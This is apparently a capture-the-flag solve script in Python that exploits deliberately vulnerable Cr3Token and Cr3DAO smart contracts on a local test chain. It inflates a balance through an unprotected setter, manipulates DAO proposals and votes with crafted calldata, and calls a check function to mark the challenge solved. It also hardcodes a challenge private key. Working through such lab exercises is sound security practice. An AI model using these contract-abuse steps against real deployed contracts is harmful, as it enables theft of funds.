#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# author: es3n1n
from cheb3 import Connection
from cheb3.utils import compile_file, encode_with_signature
from pathlib import Path

endpoint = 'http://127.0.0.1:8545/JPGAohYtTexufugKjfwhobCl/main'
private_key = '0x9efbcf24d207f22b80d59bddbc437a7a0e67eb642e0ec555766784f68616d0ee'
cr3_token_address = '0x71716A20e5D04AF799AD02416ecca91f67F17107'
cr3_dao_address = '0xD767a9a285bDA7f9d268630d142064d2DddC92AF'
conn = Connection(endpoint)
acc = conn.account(private_key)

contracts = compile_file(str(Path(__file__).parent / 'single.sol'), solc_version='0.8.10')
cr3_token_abi, cr3_token_bytecode = contracts['Cr3Token']
cr3_dao_abi, cr3_dao_bytecode = contracts['Cr3DAO']

cr3_token = conn.contract(signer=acc, address=cr3_token_address, abi=cr3_token_abi, bytecode=cr3_token_bytecode)
cr3_dao = conn.contract(signer=acc, address=cr3_dao_address, abi=cr3_dao_abi, bytecode=cr3_dao_bytecode)

if cr3_token.functions.isSolved().call():
    print('already solved')
    exit(0)

deployer_address = ''
for i in range(15):
    if len(deployer_address) > 0:
        break

    try:
        block = conn.w3.eth.get_block(i, full_transactions=True)
    except:  # noqa
        break

    for transaction in block['transactions']:
        deployer_address = transaction['from']
        break

for i in range(5):
    cr3_token.functions.setBalanceoF(i, deployer_address, 1337000000000000000000).send_transaction()

for i in range(4):
    cr3_dao.functions.createProposal('Cr3').send_transaction()

fsdata = encode_with_signature('getBalanceoF(uint,address)', 4, deployer_address)
cr3_dao.functions.vote(4, fsdata).send_transaction()

cr3_dao.functions.executeProposal(4, deployer_address, 1337).send_transaction()

cr3_dao.functions.coolCheck(2, 63, acc.address).send_transaction()

is_solved = cr3_token.functions.isSolved().call()
print('cr3_token.functions.isSolved().call():', is_solved)
exit(0 if is_solved else 1)
